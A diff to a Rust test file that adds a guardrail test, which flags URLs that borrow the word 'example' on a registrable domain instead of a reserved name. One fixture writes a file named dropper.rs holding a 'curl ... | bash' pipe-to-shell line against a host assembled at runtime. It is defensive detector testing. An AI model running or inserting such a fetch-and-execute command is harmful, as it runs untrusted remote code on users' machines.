@@ -6,7 +6,9 @@
 
 use std::fs;
 use std::path::{Path, PathBuf};
-use vts_extract::guardrails::{files_over_limit, files_with_folded_test_cfg, MAX_RS_LINES};
+use vts_extract::guardrails::{
+    files_over_limit, files_with_folded_test_cfg, urls_with_unreserved_example_hosts, MAX_RS_LINES,
+};
 
 fn fixture_dir(name: &str) -> PathBuf {
     let dir = std::env::temp_dir()
@@ -114,6 +116,69 @@ fn workspace_test_modules_keep_a_literal_cfg_test() {
         offenders
             .iter()
             .map(|p| format!("  {}", p.display()))
+            .collect::<Vec<_>>()
+            .join("\n")
+    );
+}
+
+#[test]
+fn reports_urls_whose_example_host_is_not_a_reserved_name() {
+    let dir = fixture_dir("example-urls");
+    // Assembled at runtime so this file does not match the guardrail.
+    let live = format!("get.{}.sh", "example");
+    let reserved = "https://x.example/i.sh https://get.example.invalid \
+                    https://www.example.com/a http://api.example.test";
+    fs::write(
+        dir.join("dropper.rs"),
+        format!("// curl -fsSL https://{live} | bash\n"),
+    )
+    .unwrap();
+    fs::write(
+        dir.join("notes.md"),
+        format!("See <https://{live}/x> and {reserved}\n"),
+    )
+    .unwrap();
+    fs::write(dir.join("fine.rs"), reserved).unwrap();
+    for skipped in ["target", ".claude/worktrees/old"] {
+        fs::create_dir_all(dir.join(skipped)).unwrap();
+        fs::write(
+            dir.join(skipped).join("stale.rs"),
+            format!("https://{live}"),
+        )
+        .unwrap();
+    }
+
+    let offenders = urls_with_unreserved_example_hosts(&dir);
+
+    let found: Vec<(String, String)> = offenders
+        .iter()
+        .map(|(path, host)| {
+            let name = path.file_name().unwrap().to_string_lossy().into_owned();
+            (name, host.clone())
+        })
+        .collect();
+    assert_eq!(
+        found,
+        [
+            ("dropper.rs".to_string(), live.clone()),
+            ("notes.md".to_string(), live)
+        ]
+    );
+}
+
+#[test]
+fn workspace_urls_use_reserved_example_names() {
+    let offenders = urls_with_unreserved_example_hosts(&workspace_root());
+
+    assert!(
+        offenders.is_empty(),
+        "these URLs borrow the word example on a real, registrable domain; \
+         URL scanners read a download piped into a shell from one as a live \
+         dropper — use a reserved name (*.example, *.invalid, *.test, \
+         example.com) instead:\n{}",
+        offenders
+            .iter()
+            .map(|(path, host)| format!("  {}: {host}", path.display()))
             .collect::<Vec<_>>()
             .join("\n")
     );
